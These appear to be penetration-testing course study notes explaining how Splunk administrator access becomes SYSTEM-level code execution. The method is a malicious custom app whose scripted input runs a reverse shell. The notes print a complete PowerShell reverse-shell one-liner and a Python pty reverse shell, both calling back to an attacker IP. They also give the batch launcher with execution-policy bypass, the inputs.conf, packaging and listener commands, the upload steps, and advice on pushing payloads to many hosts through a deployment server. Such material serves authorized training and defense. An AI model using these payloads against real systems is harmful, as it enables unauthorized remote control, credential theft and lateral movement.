The core chain is:

```text
Splunk Access
      ↓
Create custom application
      ↓
Scripted Input
      ↓
Splunk executes script
      ↓
PowerShell / Python
      ↓
Reverse Shell
      ↓
Splunk process privileges
      ↓
SYSTEM / root
```

![Image](https://images.openai.com/static-rsc-4/0WAX8frpuAvsuf7U40xMctzBJzzqYkLUJQhDdbGP4-Zz53c1ACokhLL9IFaIlmbtUqffY6P74qJ8v8ttKjpsPHbteyIfwQyvd6EKXvopeQegXHk2KgK7I6ei1VGXVTr94NiIi6k0KJ58GAWw5WdkVlUx241qZ4GHFwCtKFSgcEXqLnzMchUWcrphd77MAnPH?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/KrPmnnS1BUrYFjPIJ7X1zZonTLfM2RHiCE7flcuQHwqJnDfHh9XgGnkWlB3Ch7aGP3JQzGuxuan_PpaEPRNglMWtY2CgOVFFVt9zvvJLoHXLYs9RCDjewpTaP7PS5yRKZPLHmit7U1IB0Tf29dYe0QdiY8yspxDOItzK_Q5J46PZfsjFpCHE417dRFVGrLoC?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/UFGLCHzf1REsGrZBDQtK_O8g0EluPtlL0JtcoWZ4yix-wbwqzv9UVxTkQVhg3b_B6VFzERaHY9fJMjCS5V5f-X065TjElgGRBXtEsB5SHpXeVfqXkEyruWaqjHlRcWE3WrY0ivj1LqXxLRnOw2YSG9nFGFvpUOqoir-AVXWdN5VgjlC0DT07zUmjBveQN_cS?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/taZ2GpIvCRTCtboUhEw_Llw4WiHaw0uX2cA7w8uYz3MCqSjgOp0TfEPJ2IHWaHuIJxuOB7xoFkvOHZBJMMnuugmWU5HOGvqS-bWGG2rfHndz79RzHnElEHl-2x21vWDHIJAsIH43O-Or7qAx4oZ1KtVfWLrSKJK4D4f3UwPkuCI4YTQvmf6xL1i-J4hIxGTm?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/l7o5xRhMxbubRprLkpa8K1r2UC7JnM0L6TN2Hijj3faGV6tmq19B0zlMdgBzbCUk6h02luxMV-J9knDUXISY5psoJYbQ1y5VxLvUMCAuehj9M6YkzrPdfHcCvLv9SOqnaBg9_mTmzc8zsW8SI4XTjsKgpdaCy0EFwaETdD31IJDj_j_r7XCdZ0kw2HXiemrN?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/p4Fc83qfkPiCf9hkva6IAfqvAGYHELUa3ls-4VjaBMyRWG5TLJn9MafKZS_SOlvwPqjvJJsfD4z5hNfzRBjirLWHZdyIoaKr3t-VisXCCOBfEm9SlGVWdSpYD-dPY3cnprcxwr5zgap-3BS4_5hF0LRaoeH8Ui9fXt0t1_vOmYlsCBK20Z-XfELj48wFSd_X?purpose=fullsize)

---

# 1. The Main Attack

From the previous section, we learned that Splunk supports **scripted inputs**.

These allow Splunk to execute scripts and consume their `STDOUT` as input.

The module abuses this functionality by creating a **custom Splunk application** containing a reverse shell.

Since the Nmap scan identified the target as **Windows**, the module uses **PowerShell**.

The attack looks like:

```text
                    Attacker
                       │
                       │ Upload custom app
                       ▼
                 ┌────────────┐
                 │   Splunk   │
                 │   Server   │
                 └─────┬──────┘
                       │
                       ▼
                Custom Application
                       │
                       ▼
                 Scripted Input
                       │
                       ▼
                  run.bat
                       │
                       ▼
                 PowerShell
                       │
                       ▼
                 Reverse Shell
                       │
                       ▼
                    SYSTEM
```

The key point:

> **We are not exploiting a Splunk CVE here. We're abusing legitimate Splunk functionality.**

---

# 2. Splunk Custom Application

The module uses the `reverse_shell_splunk` package as a reference/example.

The custom application starts with this structure:

```text
splunk_shell/
├── bin
└── default

2 directories, 0 files
```

### Purpose of the directories

```text
splunk_shell/
│
├── bin/
│   └── Scripts that Splunk will execute
│
└── default/
    └── inputs.conf
```

The module places the reverse-shell-related scripts inside `bin`.

The `default` directory contains the configuration telling Splunk **what script to execute and how frequently**.

---

# 3. PowerShell Reverse Shell

The module uses a PowerShell one-liner:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The important values to understand are:

```text
Attacker IP   → 10.10.14.15
Listener      → 443
```

Conceptually:

```text
PowerShell
    │
    ├── Create TCP connection
    │
    ├── Connect to attacker:443
    │
    ├── Read commands
    │
    ├── Execute commands
    │
    └── Send output back
```

---

# 4. `inputs.conf` ⭐

This is one of the most important pieces of the attack.

The module uses:

```text
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

The `inputs.conf` file tells Splunk:

- Which script to run
    
- Whether it is enabled
    
- How frequently to execute it
    
- The sourcetype associated with the input
    

---

## `disabled = 0`

```text
disabled = 0
```

means the scripted input is enabled.

The module emphasizes that the input will only run when this setting is present.

---

## `interval = 10`

```text
interval = 10
```

The interval is measured in **seconds**.

So:

```text
interval = 10
       ↓
Execute every 10 seconds
```

---

# 5. The Windows `.bat` Launcher

The module creates:

```text
run.bat
```

with:

```batch
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Its purpose is to launch the corresponding PowerShell script.

Conceptually:

```text
Splunk
  ↓
run.bat
  ↓
PowerShell.exe
  ↓
run.ps1
  ↓
Reverse shell
```

The `%~dpn0` expansion refers to the batch file's drive/path/name, allowing the corresponding `.ps1` file to be referenced.

---

# 6. Creating the Splunk Package

Once the files are ready, they can be packaged into a tarball or `.spl` file.

The module uses:

```bash
tar -cvzf updater.tar.gz splunk_shell/
```

The resulting package contains:

```text
splunk_shell/
├── bin/
│   ├── rev.py
│   ├── run.bat
│   └── run.ps1
│
└── default/
    └── inputs.conf
```

### Remember the package structure

```text
Splunk App
│
├── bin/
│   └── executable scripts
│
└── default/
    └── inputs.conf
```

That structure is a major CPTS takeaway.

---

# 7. Start the Listener

Before uploading the application, the module starts a Netcat listener:

```bash
sudo nc -lnvp 443
```

Expected:

```text
listening on [any] 443 ...
```

The flow is therefore:

```text
1. Build app
       ↓
2. Start listener
       ↓
3. Upload app
       ↓
4. Splunk enables app
       ↓
5. Script executes
       ↓
6. Reverse connection
```

---

# 8. Uploading the Application

The Splunk interface provides:

```text
Install app from file
```

The module uses:

```text
https://10.129.201.50:8000/en-US/manager/search/apps/local
```

From there:

```text
Install app from file
        ↓
Browse
        ↓
Select updater.tar.gz
        ↓
Upload
```

![Image](https://images.openai.com/static-rsc-4/A_kO-mNl5-3ubasCai1LvNsF5o3I3DlxMao4Wo0oSYdFbum6A2jKlbnqLtLz7Vceo3baJKtWMvwhrHK3zl0onVp4uoYZc0pRCcWPVEWkK0Pi9jRNRxqUMPbj572uN6fuAsiUJR_jt7VvFoxr2NruJcrb8OX513nJNciqAHHCvDi6-UZugFl0GjrW5OytcUBd?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/taZ2GpIvCRTCtboUhEw_Llw4WiHaw0uX2cA7w8uYz3MCqSjgOp0TfEPJ2IHWaHuIJxuOB7xoFkvOHZBJMMnuugmWU5HOGvqS-bWGG2rfHndz79RzHnElEHl-2x21vWDHIJAsIH43O-Or7qAx4oZ1KtVfWLrSKJK4D4f3UwPkuCI4YTQvmf6xL1i-J4hIxGTm?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/31PkWkbQRgGQD8Vf9jfn6WLv1GKe75zWG3LXPI2nj7gR5K9J_Cr25enpsz6meBH2u5wHwiClVOC5XBvyvimzMXQynzCuQm1nD5ZHnJUpqz9SmAWRRiS6J2_lAoOmrAAF1Hnqq-LHgxplMvOMMj5p4kbmyqLuFHM6MvLXBjlUAVNEjfhQ3dxM735mIRaQYu8z?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/P_x10MXu2czJ7oNBtPNWi2gkcy5QCAJUEzyts0Sd38MnuX-1i2w3Bx4v5lV9UxyUkFOekgWFyyGrcmc7Iay9J8N6z-zfzp7Sk5AvvOuBUKO0OTHuxG-yTCTiBCzwfWBCd02a6YBUbY2TWDfrTg82pjGohqBCk3OnBQjfms8WR42LzN6h4rzjR_WEw_1BKOdr?purpose=fullsize)

The module notes that the application status is automatically switched to:

```text
Enabled
```

after upload.

---

# 9. Reverse Shell Received

The listener receives the connection:

```text
sudo nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145
```

We then execute:

```powershell
whoami
```

and receive:

```text
nt authority\system
```

Hostname:

```powershell
hostname
```

Output:

```text
APP03
```

Therefore:

```text
Splunk
  ↓
Custom App
  ↓
Scripted Input
  ↓
PowerShell
  ↓
Reverse Shell
  ↓
NT AUTHORITY\SYSTEM
```

🔥 **This is full SYSTEM-level command execution.**

---

# 10. Why SYSTEM Matters

`NT AUTHORITY\SYSTEM` is a highly privileged Windows account.

In the module's scenario, we therefore have:

```text
Splunk compromise
      ↓
SYSTEM
      ↓
High-privileged Windows foothold
```

From here, the module says that in a real-world assessment we could proceed with authorized enumeration for credentials stored in:

- Registry
    
- Memory
    
- File system
    

The purpose would be to identify credentials or other information useful for **lateral movement**.

If this is the initial foothold in an Active Directory environment:

```text
SYSTEM foothold
      ↓
Host enumeration
      ↓
Credential discovery
      ↓
Domain enumeration
      ↓
AD attack paths / lateral movement
```

---

# 11. Linux Version

If the target were Linux instead of Windows, the overall attack process remains the same.

The difference is the script executed by Splunk.

The module provides this Python reverse shell:

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

The important values are:

```text
ip   → attacker IP
port → listener port
```

The Linux flow becomes:

```text
Splunk
  ↓
Custom application
  ↓
inputs.conf
  ↓
rev.py
  ↓
Python
  ↓
Reverse shell
  ↓
Splunk process privileges
```

The module explicitly says that the **rest of the process is the same**:

1. Modify script
    
2. Create tarball
    
3. Upload custom app
    
4. Splunk executes it
    
5. Receive reverse shell
    

---

# 12. Deployment Server — 🔥 Important

The last part introduces a much more powerful scenario.

What if the compromised Splunk host is a **deployment server**?

Splunk deployment servers can distribute applications/configuration to **Universal Forwarders**.

Therefore, compromising the deployment server may potentially provide a path to code execution on other hosts running Universal Forwarders.

The module describes the relevant application location as:

```text
$SPLUNK_HOME/etc/deployment-apps
```

Conceptually:

```text
                 Compromised
               Splunk Server
                     │
                     │ Deployment Server
                     ▼
             ┌─────────────────┐
             │ Splunk Universal │
             │ Forwarder        │
             └────────┬────────┘
                      │
            Application deployment
                      │
          ┌───────────┼───────────┐
          ▼           ▼           ▼
        Host A      Host B      Host C
```

This changes the impact dramatically.

Instead of:

```text
Compromise one Splunk server
```

you could potentially have:

```text
Deployment Server
       ↓
Push application
       ↓
Universal Forwarders
       ↓
Multiple hosts
```

---

# 13. Windows Deployment Server Consideration

The module makes an important platform-specific observation:

> In a Windows-heavy environment, use a PowerShell reverse shell because Universal Forwarders do not install with Python like the Splunk server.

So:

```text
Splunk Server
    │
    ├── Python available
    │
    └── PowerShell available on Windows

Universal Forwarder
    │
    └── Windows environment
          ↓
       PowerShell
       preferred
```

This is a great example of why you should **enumerate the target environment before choosing your payload/script**.

---

# 14. Complete Attack Flow

Here's the complete methodology from this section:

```text
                 ┌────────────────────┐
                 │ Discover Splunk    │
                 └─────────┬──────────┘
                           ↓
                 ┌────────────────────┐
                 │ Obtain Admin Access│
                 └─────────┬──────────┘
                           ↓
                 ┌────────────────────┐
                 │ Create Custom App  │
                 └─────────┬──────────┘
                           ↓
              ┌────────────┴────────────┐
              ↓                         ↓
          bin/                       default/
              │                         │
       Scripts/Payloads            inputs.conf
              │                         │
              └────────────┬────────────┘
                           ↓
                 ┌────────────────────┐
                 │ Package .tar.gz    │
                 │ or .spl            │
                 └─────────┬──────────┘
                           ↓
                 ┌────────────────────┐
                 │ Start Listener     │
                 └─────────┬──────────┘
                           ↓
                 ┌────────────────────┐
                 │ Upload Application │
                 └─────────┬──────────┘
                           ↓
                 ┌────────────────────┐
                 │ App Enabled        │
                 └─────────┬──────────┘
                           ↓
                 ┌────────────────────┐
                 │ Scripted Input     │
                 └─────────┬──────────┘
                           ↓
                 ┌────────────────────┐
                 │ Script Executes    │
                 └─────────┬──────────┘
                           ↓
                 ┌────────────────────┐
                 │ Reverse Shell      │
                 └─────────┬──────────┘
                           ↓
                    SYSTEM / root
                           │
                           ▼
                    Host Enumeration
                           │
                           ▼
                    AD Enumeration
```

---

# 15. Attack Components to Memorize

|Component|Purpose|
|---|---|
|`bin/`|Contains scripts|
|`default/`|Contains configuration|
|`inputs.conf`|Defines scripted inputs|
|`disabled = 0`|Enables input|
|`interval = 10`|Runs every 10 seconds|
|`.bat`|Windows launcher|
|`.ps1`|PowerShell script|
|`rev.py`|Linux/Python reverse shell|
|`.spl` / `.tar.gz`|Application package|
|`Install app from file`|Upload mechanism|
|`$SPLUNK_HOME/etc/deployment-apps`|Deployment-server application directory|

---

# 🎯 CPTS High-Value Points

### 1. Splunk can execute scripts

This isn't necessarily a vulnerability.

It's **built-in functionality**.

```text
Admin access
     ↓
Custom application
     ↓
Scripted Input
     ↓
Script execution
     ↓
RCE
```

### 2. Platform matters

```text
Windows → PowerShell / Batch
Linux   → Bash / Python
```

### 3. `inputs.conf` is critical

Know what it does:

```text
[script://...]
disabled = 0
interval = 10
sourcetype = shell
```

### 4. Package structure

```text
splunk_shell/
├── bin/
└── default/
```

### 5. Privilege depends on Splunk's execution context

In the module:

```text
Windows → NT AUTHORITY\SYSTEM
```

On Linux, the resulting shell inherits the privileges of the Splunk process.

### 6. Deployment Server can dramatically increase impact

```text
Splunk Deployment Server
        ↓
Universal Forwarders
        ↓
Potential execution on multiple hosts
```

---

# 🧪 CPTS Enumeration → Exploitation Checklist

## Initial

-  Identify Splunk
    
-  Identify OS
    
-  Identify version
    
-  Check port `8000`
    
-  Check port `8089`
    
-  Determine authentication
    
-  Obtain authorized administrative access
    

## Splunk functionality

-  Check installed applications
    
-  Check custom application functionality
    
-  Check scripted inputs
    
-  Understand `inputs.conf`
    
-  Determine whether scripts can be executed
    

## Host-specific

### Windows

-  PowerShell available
    
-  Batch scripts available
    
-  Determine Splunk process privileges
    
-  Check whether it runs as SYSTEM
    

### Linux

-  Python available
    
-  Bash available
    
-  Determine Splunk process privileges
    
-  Check whether it runs as root
    

## Post-exploitation

-  Enumerate local system
    
-  Look for credentials
    
-  Check registry/memory/filesystem where authorized
    
-  Determine domain membership
    
-  Enumerate Active Directory if applicable
    
-  Check whether Splunk is a deployment server
    
-  Identify Universal Forwarders
    

---

# ⚡ Final Cheat Sheet

```text
SPLUNK ATTACK
│
├── Need Splunk access
│
├── Create custom app
│   │
│   ├── bin/
│   │   └── Scripts
│   │
│   └── default/
│       └── inputs.conf
│
├── inputs.conf
│   ├── disabled = 0
│   └── interval = 10
│
├── Package
│   ├── .spl
│   └── .tar.gz
│
├── Install app from file
│
├── App becomes enabled
│
├── Scripted Input executes
│
├── Windows
│   ├── .bat
│   └── PowerShell
│
├── Linux
│   └── Python
│
├── Reverse shell
│
├── Splunk privileges
│   ├── Windows → SYSTEM
│   └── Linux → process privileges
│
└── If Deployment Server
    ↓
    $SPLUNK_HOME/etc/deployment-apps
    ↓
    Universal Forwarders
    ↓
    Potential multi-host impact
```

## 🔥 The one thing to remember

**Splunk admin access can be much more dangerous than simply reading logs.**

The critical chain from this module is:

> **Admin/unauthenticated Splunk access → custom application → `inputs.conf` → scripted input → Python/PowerShell/Batch/Bash → OS command execution → reverse shell → Splunk process privileges.**

And the escalation in impact is:

> **Compromised Splunk Deployment Server → deployment applications → Universal Forwarders → potentially multiple additional hosts.**